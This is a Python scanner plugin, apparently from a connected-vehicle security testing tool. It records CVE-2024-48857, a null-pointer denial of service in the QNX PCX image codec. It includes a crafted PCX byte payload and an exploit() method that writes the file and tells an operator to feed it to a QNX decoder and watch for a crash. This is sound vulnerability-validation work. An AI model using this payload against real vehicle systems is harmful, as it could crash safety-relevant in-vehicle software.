#!/usr/bin/env python3
"""Active validation PoC for connected-vehicle vulnerability scanning."""
from __future__ import annotations

from active_validation_core import run_active_validation
from iv_plugin_base import IVIVulnerabilityPlugin
from local_exp_stimulus import build_local_sample_probe, write_temp_sample


VULN = {
    "id": 32,
    "cve": "CVE-2024-48857",
    "year": 2025,
    "domain": "车载OS/QNX",
    "vendor_product": "BlackBerry QNX SDP",
    "component": "PCX image codec",
    "type": "空指针/DoS",
    "summary": "QNX PCX图像编解码器空指针导致DoS。",
    "source_description": "NULL pointer dereference in the PCX image codec in QNX SDP versions 8.0, 7.1 and 7.0 could allow an unauthenticated attacker to cause a denial-of-service condition in the context of the process using the image codec.",
    "poc_status": "未见公开PoC；供应商公告",
    "research_value": "QNX广泛用于IVI、ADAS和域控制器，属于车载基础软件风险。",
    "source_url": "https://nvd.nist.gov/vuln/detail/CVE-2024-48857",
    "references": [
        "https://nvd.nist.gov/vuln/detail/CVE-2024-48857",
        "https://support.blackberry.com/pkb/s/article/140334",
        "https://cveawg.mitre.org/api/cve/CVE-2024-48857"
    ],
    "affected": [
        {
            "vendor": "BlackBerry",
            "product": "QNX Software Development Platform (SDP)",
            "versions": [
                {
                    "version": "8.0, 7.1 and 7.0",
                    "status": "affected"
                }
            ]
        }
    ],
    "signature_tokens": [
        "CVE-2024-48857",
        "BlackBerry",
        "QNX",
        "SDP",
        "PCX",
        "image",
        "codec",
        "DoS",
        "NULL",
        "pointer",
        "dereference",
        "could",
        "allow",
        "unauthenticated",
        "cause",
        "denial-of-service",
        "condition",
        "context",
        "process",
        "using",
        "QNX Software Development Platform (SDP"
    ]
}


def _write_qnx_pcx_null_sample() -> str:
    payload = (
        b"\x0a\x05\x00\x00"
        + b"\x00\x00\x00\x00\x00\x00\x00\x00"
        + b"\x00\x00"
        + b"\x00" * 48
        + b"\x00\x00"
        + b"\x00\x00"
        + b"\x00" * 58
        + b"\x0c"
        + b"\x00" * 64
    )
    return write_temp_sample("autosec_cve_2024_48857_", ".pcx", payload)


def _pcx_null_probe(plugin, vuln):
    return build_local_sample_probe(
        plugin,
        sample_param="pcx_sample_path",
        command_params=("qnx_image_decoder_cmd", "decoder_cmd"),
        generated_sample=_write_qnx_pcx_null_sample,
        phenomenon="crafted PCX sample prepared for QNX PCX codec null-dereference observation",
        operator_action="Run sample_path with a QNX image decoder via qnx_image_decoder_cmd/decoder_cmd and observe null dereference, abort, or process restart.",
    )


class Poc23CVE202448857NullDerefDoSAuditPlugin(IVIVulnerabilityPlugin):
    meta_display_id = 'XLSX-032'
    meta_poc_name = 'CVE-2024-48857 空指针/DoS Active Validation'
    meta_cve_id = 'CVE-2024-48857'
    meta_severity = 'High'
    meta_protocol = 'local'
    meta_target_os = ['qnx', 'linux']
    meta_required_params = ['software_inventory_text']
    meta_profiles = ['local_artifact']
    meta_source_url = 'https://nvd.nist.gov/vuln/detail/CVE-2024-48857'
    meta_attack_surface = '系统/供应链组件'
    is_disruptive = True
    meta_destructive_level = "Disruptive"

    def check_prerequisites(self):
        return True

    def exploit(self):
        return run_active_validation(self, VULN, probe=_pcx_null_probe)
